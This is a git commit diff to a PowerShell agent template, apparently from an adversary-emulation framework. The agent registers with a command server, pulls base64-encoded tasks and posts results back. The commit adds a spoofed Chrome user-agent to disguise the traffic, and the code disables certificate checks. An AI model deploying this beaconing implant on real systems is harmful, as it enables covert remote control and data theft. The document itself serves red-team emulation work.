0f0901ef0b5e00e68e289582f160a13a0dfc3e9c
david <davidhunt@mitre.org>
2019-05-08 08:43:35 -0400

    adding user-agent to agent

--- templates/54ndc47.ps1
+++ templates/54ndc47.ps1
@@ -5,26 +5,27 @@ $paw2 = whoami
 $paw = $paw1 + $paw2
 
 function get-PSVersion(){
-	$ps_table = $PSVersionTable.PSVersion
-	return [double]$ps_table.Major
+    $ps_table = $PSVersionTable.PSVersion
+    return [double]$ps_table.Major
 }
 
 function make-Request($ps_version, $r_endpoint, $r_body){
-	if($ps_version -ge 6){
-		return irm "$server$r_endpoint" -Method POST -Body $r_body -SkipCertificateCheck 
-	}	
-	else{
-		$web_client = Make-WebClient
-		return $web_client.UploadString("$server$r_endpoint",$r_body)
-	}
+    if($ps_version -ge 6){
+        return irm "$server$r_endpoint" -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Method POST -Body $r_body -SkipCertificateCheck
+    }
+    else{
+        $web_client = Make-WebClient
+        $web_client.Headers.add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
+        return $web_client.UploadString("$server$r_endpoint",$r_body)
+    }
 }
 
 function Make-WebClient(){
-	if($server.contains("https")){
-		[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
-	}
-	$web = New-Object System.Net.WebClient
-	return $web
+    if($server.contains("https")){
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
+    }
+    $web = New-Object System.Net.WebClient
+    return $web
 }
 
 function Register-Self($web_client) {
@@ -35,7 +36,7 @@ function Register-Self($web_client) {
         executor="psh"
     } | ConvertTo-Json
     $body = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
-	$encodedReg = make-Request $ps_version "/sand/register" $body
+    $encodedReg = make-Request $ps_version "/sand/register" $body
     return [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encodedReg))
 }
 
@@ -46,7 +47,7 @@ function Get-Instructions($web_client) {
         executor="psh"
     } | ConvertTo-Json
     $body = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
-	$encodedTask = make-Request $ps_version "/sand/instructions" $body
+    $encodedTask = make-Request $ps_version "/sand/instructions" $body
     return [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encodedTask))
 }
 
@@ -73,7 +74,7 @@ function Post-Results($web_client, $task) {
         status=$status
     } | ConvertTo-Json
     $body = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
-	make-Request $ps_version "/sand/results" $body | out-null
+    make-Request $ps_version "/sand/results" $body | out-null
 }
 
 $ps_version = get-PSVersion
